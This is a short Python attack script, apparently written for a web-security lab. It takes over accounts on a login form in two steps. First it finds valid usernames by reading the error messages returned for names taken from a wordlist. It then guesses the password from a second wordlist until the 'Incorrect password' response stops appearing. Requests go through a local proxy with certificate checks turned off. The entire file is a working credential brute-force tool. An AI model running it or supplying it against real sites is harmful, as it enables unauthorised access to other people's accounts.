import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
logs = ""

def find_username(url):
    logs = "Findings valid username "
    with open('../username_list.txt') as f:
        lines = f.readlines()
        for username in lines:
            sys.stdout.write('\r' + logs + username.strip("\n"))
            sys.stdout.flush()
            data = {"username": username.strip('\n'), "password": "a"}
            r = requests.post(url, verify=False, proxies=proxies, data=data)
            res = r.text
            if 'Invalid username' not in res:
                logs = "(+) Valid username found %s" % username.strip('\n')
                sys.stdout.write('\r' + logs)
                sys.stdout.flush()
                find_password(url, username.strip('\n'))
                break

def find_password(url, username):
    logs = "Findings password "
    with open('../password_list.txt') as f:
        lines = f.readlines()
        for password in lines:
            sys.stdout.write('\r' + logs + password.strip("\n"))
            sys.stdout.flush()
            data = {"username": username, "password": password.strip("\n") }
            r = requests.post(url, verify=False, proxies=proxies, data=data)
            res = r.text
            if 'Incorrect password' not in res:
                logs = "username: %s \n Password: %s" % (username, password.strip('\n'))
                sys.stdout.write('\r' + logs)
                sys.stdout.flush()
                break


def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Findings valid username")
	# password_length = sql_password_length(url)
	find_username(url)
	
	
if __name__ == "__main__":
	main()